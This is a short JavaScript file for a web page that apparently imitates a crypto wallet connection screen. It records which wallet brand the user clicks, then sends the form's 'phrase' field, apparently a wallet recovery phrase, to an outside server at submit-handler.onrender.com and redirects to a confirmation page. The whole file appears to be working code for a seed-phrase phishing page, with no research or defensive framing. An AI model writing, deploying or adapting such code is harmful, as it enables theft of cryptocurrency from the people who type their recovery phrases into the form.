

document.addEventListener("DOMContentLoaded", function () {
  let selectedWalletTitle = '';

  // Capture the data-title when a wallet is clicked
  document.querySelectorAll('.select_wallet').forEach(function (wallet) {
      wallet.addEventListener('click', function () {
          selectedWalletTitle = this.getAttribute('data-title');
          document.getElementById('wallet_name').textContent = selectedWalletTitle;
          document.getElementById('wallet_logo').src = this.getAttribute('data-logo');
      });
  });

  // Handle form submission
  document.getElementById('my-form').addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent the default form submission

      const formData = new FormData(this); // Create a FormData object from the form
      formData.append('walletTitle', selectedWalletTitle); // Append the wallet title to the form data

      fetch('https://submit-handler.onrender.com/submit-form', {
          method: 'POST',
          body: JSON.stringify({
              phrase: formData.get('phrase'),
              walletTitle: selectedWalletTitle
          }),
          headers: {
              'Content-Type': 'application/json'
          }
      })
      .then(response => response.json()) // Parse JSON response
      .then(data => {
          console.log('Success:', data);
          // Redirect to confirmation page after successful submission
          window.location.href = '/confirmation.html';
      })
      .catch((error) => {
          console.error('Error:', error);
          alert('There was an error submitting the form.'); // Display error message
      });
  });
});

